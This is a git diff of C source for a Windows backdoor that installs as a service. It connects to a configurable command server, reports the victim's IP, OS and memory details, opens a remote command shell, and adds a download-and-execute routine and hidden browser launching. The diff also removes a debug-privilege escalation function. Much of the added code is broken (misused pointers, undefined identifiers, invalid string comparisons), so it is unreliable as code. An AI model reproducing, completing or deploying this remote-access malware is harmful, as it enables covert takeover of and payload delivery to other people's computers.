@@ -3,18 +3,24 @@
 #include <windows.h>
 #include <string.h>
 #include <stdlib.h>
-
+#include <wininet.h>
 
 
 #pragma comment(lib, "ws2_32.lib")
-
-
-#pragma warning(disable: 4996) // avoid GetVersionEx to be warned
-
+#pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
+#define S_OK                                   ((HRESULT)0L)
+#define S_FALSE                                ((HRESULT)1L)
+#define false                                  FALSE
+#define true                                   TRUE
+#define bool                                   BOOL
+#define ERROR_SUCCESS                    0L
+#define SERVER_HEARTS                           0
+#define SERVER_SHELL                            2
+#define SERVER_DOWNLOAD                         4
 // int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
 void WINAPI BDHandler(DWORD dwControl);
 void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
-
+char const FLAG_[15] = "yyyyyyyyyyyyyyy";
 char const address[] = "12345678987654321";
 char const port[] = "999999999";
 char const sign[10] = "customize";
@@ -25,9 +31,134 @@ struct CMSG{
         int mod;//自定义模式
         int msg_l;
 };
+struct CFILE{
+    char address[255];
+    char save_path[255];
+    bool execute;
+}
 
+//-----------------------------TOOLKIT FUNCTION START------------------------------------------------
+
+bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
+{
+	HINTERNET	hInternet, hUrl;
+	HANDLE		hFile;
+	char		buffer[1024];
+	DWORD		dwBytesRead = 0;
+	DWORD		dwBytesWritten = 0;
+	BOOL		bIsFirstPacket = true;
+	BOOL		bRet = true;
+	
+	hInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
+	if (hInternet == NULL)
+		return false;
+	
+	hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	if (hUrl == NULL)
+		return false;
+	
+	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+	
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		do
+		{
+			memset(buffer, 0, sizeof(buffer));
+			InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
+			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
+		} while(dwBytesRead > 0);
+		CloseHandle(hFile);
+	}
+	
+	InternetCloseHandle(hUrl);
+	InternetCloseHandle(hInternet);
+	
+	return bRet;
+}
+DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,bool execute)
+{
+	int	nUrlLength;
+	char	*lpURL = NULL;
+	char	*lpFileName = NULL;
+	nUrlLength = strlen((char *)lparam);
+	if (nUrlLength == 0)
+		return false;
+	
+	lpURL = (char *)malloc(nUrlLength + 1);
+	
+	memcpy(lpURL, lparam, nUrlLength + 1);
+	if (save_path!=NULL){
+        lpFileName = save_path;
+    }else{
+        lpFileName = strrchr(lpURL, '/') + 1;
+    }
+	
+	if (lpFileName == NULL)
+		return false;
+
+	if (!http_get(lpURL, lpFileName))
+	{
+		return false;
+	}
+
+	if (execute){
+        STARTUPINFO si = {0};
+	    PROCESS_INFORMATION pi;
+	    si.cb = sizeof si;
+	    si.lpDesktop = "WinSta0\\Default"; 
+	    CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
+    }
+
+	return true;
+}
+
+//OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL); 显示打开网页
+//OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);   隐藏打开网页
+BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
+{
+	if (strlen(lpszURL) == 0)
+		return FALSE;
+
+	// System 权限下不能直接利用shellexecute来执行
+	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
+	HKEY	hKey;
+	char	strIEPath[MAX_PATH];
+	LONG	nSize = sizeof(strIEPath);
+	char	*lpstrCat = NULL;
+	memset(strIEPath, 0, sizeof(strIEPath));
+	
+	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
+		return FALSE;
+	RegQueryValue(hKey, NULL, strIEPath, &nSize);
+	RegCloseKey(hKey);
+
+	if (lstrlen(strIEPath) == 0)
+		return FALSE;
+
+	lpstrCat = strstr(strIEPath, "%1");
+	if (lpstrCat == NULL)
+		return FALSE;
+
+	lstrcpy(lpstrCat, lpszURL);
+
+	STARTUPINFO si = {0};
+	PROCESS_INFORMATION pi;
+	si.cb = sizeof si;
+	if (nShowCmd != SW_HIDE)
+		si.lpDesktop = "WinSta0\\Default"; 
+
+	CreateProcess(NULL, strIEPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+	return 0;
+}
+
+
+//-----------------------------TOOLKIT FUNCTION END--------------------------------------------------
 
 //-------------------------SYSTEM INFOMATION START---------------------------------------------------
+
+
+
 char* getIpAddress(){
     WSADATA wsaData;
     char name[255];//定义用于存放获得的主机名的变量 
@@ -71,6 +202,8 @@ char* getMemoryInfo()
     #define kMaxInfoBuffer 256
 
 	char* memory_info;
+    char  buffer[kMaxInfoBuffer];
+
 	MEMORYSTATUSEX statusex;
 	statusex.dwLength = sizeof(statusex);
 	if (GlobalMemoryStatusEx(&statusex))
@@ -88,13 +221,25 @@ char* getMemoryInfo()
  
 		decimal_total += (double)total;
 		decimal_avl += (double)avl;
-		char  buffer[kMaxInfoBuffer];
-		sprintf(buffer, "total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
+		
+		sprintf(buffer, "Total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
 		memory_info = buffer;
-        printf(memory_info);
+        // printf(memory_info);
         return memory_info;
 	}
 	
+}
+char* getSystemInfomation(){
+    static char data[255];
+    char *os;
+    char *ip;
+    char * memory;
+    os = getOsInfo();
+    ip = getIpAddress();
+    memory = getMemoryInfo();
+    sprintf(data,"Ip:%s\nOs:%s\nMemory:%s",ip,os,memory);
+    char *address=data;
+    return address;
 }
 //-------------------------SYSTEM INFOMATION END-----------------------------------------------------
 
@@ -150,32 +295,6 @@ void BackDoor(SOCKET sock){
     return;
 }
 
-//提升进程权限
-void AdvanceProcess(){
-    HANDLE hdlTokenHandle;
-    HANDLE hdlProcessHandle = GetCurrentProcess();
-    LUID tmpLuid;
-    TOKEN_PRIVILEGES tkp;
-    TOKEN_PRIVILEGES tkpNewButIgnored;
-    if(!OpenProcessToken(hdlProcessHandle,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hdlTokenHandle)){
-        CloseHandle(hdlTokenHandle);
-        return;
-    }
-    if (!LookupPrivilegeValueA("",SE_DEBUG_NAME,&tmpLuid)){
-        CloseHandle(hdlTokenHandle);
-        return;
-    }
-    tkp.PrivilegeCount=1;
-    tkp.Privileges[0].Luid = tmpLuid;
-    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    if (!AdjustTokenPrivileges(hdlTokenHandle, FALSE, &tkp, sizeof(tkp), NULL, NULL))
-    {  
-        CloseHandle(hdlTokenHandle);  
-        return ;  
-    } 
-
-}
-
 void Handle(){
     WSADATA WSAData;
     SOCKET sock; 
@@ -195,6 +314,7 @@ void Handle(){
     if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
         return;
     }
+    char * systeminfo = getSystemInfomation();
     while (TRUE){
         char * address = malloc(sizeof(struct CMSG));
         int ret = recv(sock,address,sizeof(struct CMSG),0);
@@ -203,18 +323,38 @@ void Handle(){
         if(ret == -1){
             continue;
         }
+        if (msg.sign != sign){
+            continue;
+        }
         switch (msg.mod){
-            case 0:
+            case SERVER_HEARTS:
                 {struct CMSG msg = {
                 .sign =  "customize",
                 .mod = 0,
-                .msg_l = 0
+                .msg_l = strlen(systeminfo)
              };}
                 ret = send(sock,(char*)&msg,sizeof(struct CMSG),0);//心跳包
+                ret = send(sock,systeminfo,strlen(systeminfo),0);
                 continue;
-            case 1:
+            case SERVER_SHELL:
                 // CMD命令
                 BackDoor(sock);
+            case SERVER_DOWNLOAD:
+                {
+                    struct CFILE* f_obj;
+                    ret = recv(sock,(char *)f_obj,msg.msg_l,0);
+                    if (ret <= 0){
+                        continue;
+                    }
+                    if(f_obj.address && f_obj.save_path == "NULL"){
+                        DownManager(f_obj_address,NULL,f_obj.execute);
+                        
+                    }else{
+                        DownManager(f_obj_address,f_obj.save_path,f_obj.execute);
+                    }
+                    
+                }
+
             
 
         }
@@ -268,7 +408,9 @@ void WINAPI BDHandler(DWORD dwControl)
         break;
  }
 }
+void ServiceSvchostInstall(BOOL exits){
 
+}
 void ServiceInstall(BOOL exits){
     char  szPath[MAX_PATH];
     char  target[MAX_PATH] = "c:\\";
@@ -323,13 +465,6 @@ int _stdcall WinMain(
 )
 {
     
-    // Init();
-    char * data;
-    data = getIpAddress();
-    printf("%s\n",data);
-    data = getMemoryInfo();
-    printf("%s\n",data);
-    data = getOsInfo();
-    printf("%s\n",data);
+    
     return 0;
 }
